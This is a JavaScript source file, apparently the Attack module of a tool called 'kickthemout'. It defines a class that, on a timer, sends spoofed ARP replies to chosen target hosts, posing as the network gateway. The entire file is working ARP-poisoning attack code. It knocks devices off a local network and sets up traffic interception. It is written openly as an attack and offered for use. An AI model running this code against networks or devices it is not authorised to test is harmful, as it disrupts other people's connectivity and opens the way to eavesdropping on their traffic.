'use strict'
const debug = require('debug')('kickthemout:Attack')
const arp = require('arpjs')

class Attack {
  constructor (packetInterval) {
    this.packetInterval = packetInterval || 8000 // recommended every 10 sec
  }

  setInterface (iface) {
    this.iface = iface
    debug('Selecting interface for ARP Spoofing:', this.iface.name)
    arp.setInterface(this.iface.name)
    return this // for method chaining
  }

  setTarget (hostsArr) {
    if (!Array.isArray(hostsArr)) hostsArr = [hostsArr]
    this.targets = hostsArr
    return this // for method chaining
  }

  setPacketInterval (packetInterval) {
    this.packetInterval = packetInterval
    return this // for method chaining
  }

  start () {
    if (!this.targets) throw new Error('No target acquired.')
    var self = this
    this.stop()

    this.runningAttack = setInterval(function () {
      self.targets.forEach(function (target) {
        debug('Sending ARP Reply to', target, 'from', self.iface.gateway_ip)
        arp.poison(target, self.iface.gateway_ip)
      })
    }, self.packetInterval)

    return this // for method chaining
  }

  pause (ms) {
    ms = ms || 5000
    this.stop()
    setTimeout(this.start, ms)
    return this // for method chaining
  }

  stop () {
    clearInterval(this.runningAttack)
    return this // for method chaining
  }
}

module.exports = Attack
